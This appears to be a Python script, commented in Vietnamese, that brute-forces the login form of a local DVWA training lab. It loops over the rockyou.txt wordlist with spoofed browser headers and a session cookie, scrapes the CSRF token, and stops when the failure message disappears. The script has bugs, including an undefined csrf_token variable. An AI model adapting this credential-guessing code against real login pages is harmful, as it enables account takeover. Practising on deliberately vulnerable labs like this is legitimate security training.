import requests
import re

url = 'http://localhost:4280/vulnerabilities/brute/'
params_base = {'username': 'admin', 'Login': 'Login', 'user_token': csrf_token}

headers = {
    'sec-ch-ua': '',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'http://localhost:4280/vulnerabilities/brute/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low'
}

# Đọc danh sách mật khẩu từ tệp pass.txt
with open('rockyou.txt', 'r') as password_file:
    for line in password_file:
        # Loại bỏ ký tự xuống dòng từ mật khẩu
        password = line.strip()
        # Thêm mật khẩu vào params_base


        params = params_base.copy()
        params['password'] = password
    
        # Gửi yêu cầu GET với mật khẩu khác nhau
        response = requests.get(url, params=params, headers=headers)

        if response.status_code != 200:
            pattern = r'<input.*?type=["\']hidden["\'].*?name=["\']user_token["\'].*?value=["\'](.*?)["\'].*?>'
            match = re.search(pattern, response.text)
            user_token = match.group(1)
            params['user_token'] = user_token

    # Kiểm tra và xử lý phản hồi ở đây
    # Ví dụ: nếu có dấu hiệu mật khẩu đúng, bạn có thể in ra và dừng vòng lặp
        if "Username and/or password incorrect." not in response.text:
            print(f"Đã tìm thấy mật khẩu đúng: {password}")
            break